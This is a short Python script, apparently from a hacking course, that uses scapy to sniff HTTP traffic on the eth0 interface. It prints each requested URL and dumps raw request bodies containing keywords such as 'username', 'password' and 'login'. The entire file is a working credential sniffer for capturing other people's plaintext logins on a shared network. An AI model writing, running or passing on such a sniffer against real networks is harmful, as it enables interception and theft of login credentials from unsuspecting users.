#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())
        url= packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        print(url)

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user","uname","password", "login","pass"]
            try:
                for kayword in keywords:
                    if kayword.encode() in load: # using encode to change the keyword into byte type
                        print(load)
                        break
            except Exception as e:
                pass


sniff("eth0")